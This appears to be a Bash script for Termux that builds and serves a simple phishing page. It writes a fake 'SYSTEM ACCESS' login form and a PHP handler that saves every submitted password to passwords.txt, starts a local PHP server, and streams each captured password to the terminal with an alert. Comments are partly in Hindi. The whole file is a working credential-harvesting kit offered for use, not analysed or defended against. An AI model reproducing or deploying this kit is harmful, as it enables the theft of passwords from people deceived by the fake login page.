#!/bin/bash

# --- 1. CHECK & INSTALL PROOT (The Savior) ---
if ! command -v termux-chroot &> /dev/null; then
    echo -e "\033[1;33m[*] Installing Proot (Permission Fixer)...\033[0m"
    pkg install proot -y
fi

# --- 2. CLEANUP ---
pkill -f php > /dev/null 2>&1
rm -rf auth/

# --- 3. CREATE FILES ---
mkdir -p auth
# Login Page
cat > auth/index.php <<EOF
<html>
<body style="background:black;color:#00ff00;text-align:center;font-family:monospace;margin-top:100px;">
<h1>☠️ SYSTEM ACCESS ☠️</h1>
<p>Secure Login Required</p>
<form method="POST" action="login.php">
<input style="padding:10px;width:80%" name="pass" placeholder="Enter Password"><br><br>
<button style="background:red;color:white;padding:10px;border:none;">UNLOCK</button>
</form>
</body>
</html>
EOF

# Login Logic
cat > auth/login.php <<EOF
<?php
file_put_contents("../passwords.txt", "Pass: " . \$_POST['pass'] . "\n", FILE_APPEND);
header('Location: /');
?>
EOF

# --- 4. THE MAGIC RUNNER ---
GREEN='\033[1;32m'
CYAN='\033[1;36m'
RED='\033[1;31m'
RESET='\033[0m'

clear
echo -e "${GREEN}=========================================${RESET}"
echo -e "${CYAN}     GOD MODE SERVER (Proot Engine)      ${RESET}"
echo -e "${GREEN}=========================================${RESET}"

echo -e "${CYAN}[*] Starting Server inside Virtual Root...${RESET}"

# YAHAN HAI JAADU: Hum 'termux-chroot' ke andar PHP chala rahe hain
# Iske andar /tmp folder real hota hai, isliye permission error aa hi nahi sakta.
termux-chroot php -S 127.0.0.1:8080 -t auth > /dev/null 2>&1 &
PID=$!
sleep 3

# --- 5. CHECK STATUS ---
# Hum process ID check nahi karenge, seedha port check karenge
if netstat -tuln | grep ":8080" > /dev/null; then
    echo -e "${GREEN}[✔] SERVER STARTED SUCCESSFULLY!${RESET}"
    echo -e "${CYAN}Link: http://127.0.0.1:8080${RESET}"
    echo -e "${RED}[-] Press Ctrl + C to Stop${RESET}"
    
    # Logs
    touch passwords.txt
    tail -f passwords.txt | while read line; do
        echo -e "${GREEN}[+] CAPTURED: $line${RESET}"
        echo -e "\a"
    done
else
    echo -e "${RED}[!] Failed via Proot. Trying direct fallback...${RESET}"
    # Agar Proot bhi fail ho gaya (jo nahi hona chahiye), to Direct try karo
    php -S 127.0.0.1:8080 -t auth &
    echo -e "${CYAN}Check Link: http://127.0.0.1:8080${RESET}"
fi
